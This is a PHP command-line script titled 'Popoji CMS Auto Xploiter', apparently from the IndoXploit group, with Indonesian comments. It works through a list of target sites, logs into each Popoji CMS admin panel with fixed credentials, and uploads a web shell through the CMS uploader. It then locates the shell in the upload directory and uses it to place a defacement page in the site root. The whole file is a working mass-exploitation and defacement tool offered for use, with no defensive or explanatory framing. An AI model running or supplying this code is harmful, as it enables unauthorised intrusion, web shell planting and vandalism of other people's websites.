<?php
set_time_limit(0);
error_reporting(0);

function login($url,$user,$pass) {
	$post_login = array(
		"mod" => "login",
		"act" => "proclogin",
		"username" => $user,
		"password" => $pass,
		);
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, $url."/po-admin/login.php");
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_login);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	return curl_exec($ch);
		  curl_close($ch);
}
function ch($url,$post) {
	$ch = curl_init($url);
	if($post !=null) {
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	return curl_exec($ch);
		  curl_close($ch);
}
function cek($url) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	return curl_exec ($ch);
		  curl_close($ch);
}
function cover() {
	echo "<--------------------><-------------------->\n";
	echo "[ Popoji CMS Auto Xploiter ]\n";
	echo "// Coded by Mr. Error 404 ft. tu5b0l3d - IndoXploit //\n";
	echo "cara pake: php popoji.php [list_target.txt] [shell_kalian.jpg] [shell_kalian.php] [file_deface.html]\n";
	echo "contoh: php popoji.php target.txt indoxloit.jpg indoxploit.php deface.html\n";
	echo "<--------------------><-------------------->\n\n\n";
}
$username_popoji = "indoxploit"; // ganti dengan username kalian.
$password_popoji = "indoxploit"; // ganti dengan paasword kalian.
$sites = explode("\n", file_get_contents($argv[1]));
$shell = $argv[2];
$nama_shell = $argv[3];
$deface = $argv[4];
$pecah = explode(".", $nama_shell);
$nama = $pecah[0];
$ext = $pecah[1];
if(isset($sites) AND isset($shell) AND isset($nama_shell) AND isset($deface)) {
	cover();
	foreach($sites as $url) {
		echo "[+] Nyecan: $url\n";
		$login = login($url, $username_popoji, $password_popoji);
		if(preg_match("/beranda|keluar|selamat datang|member|admin/i", $login)) {
			echo "[+] Login OK\n";
			$post_upload = array(
				"file" => "@$shell",
				"name" => $nama_shell,
				);
			ch($url."/po-admin/js/plugins/uploader/upload.php", $post_upload);
			$cek_folder = cek("$url/po-content/po-upload/");
			if(preg_match("/Index of \/po-content\/po-upload/", $cek_folder) AND !preg_match("/403/", $cek_folder)) {
				preg_match("/<li><a href=\"$nama-(.*?)-polibrary.$ext\">/", $cek_folder, $shellmu);
				$shellmu[1] = "$nama-".$shellmu[1]."-polibrary.$ext";
				$link_shell = $url."/po-content/po-upload/".$shellmu[1];
				echo "[+] Shellmu: $link_shell\n";
				$post_deface = array(
					"tipe_upload" => "home_root",
					"ix_file" => "@$deface",
					"upload" => "upload",
					);
				$depes = ch($link_shell."?do=upload", $post_deface);
				if(preg_match("/uploaded!/i", $depes) AND preg_match("/hacked/i", cek("$url/$deface"))) {
					echo "[+] Sukses Depes! -> $url/$deface\n\n";
				} else {
					echo "[-] Gagal Depes!!\n\n";
				}
			} else {
				echo "[+] Lokasi Shellnya forbidden / kena tebas gann :(\n\n";
			}
		} else {
			echo "[+] Login Gagal\n\n";
		}
	}
} else {
	echo "cara pake: php ".$argv[0]." [shell_kalian.jpg] [shell_kalian.php] [file_deface.html]\n";
	echo "contoh: php ".$argv[0]." shell.jpg indoxploit.php deface.html\n";
}
?>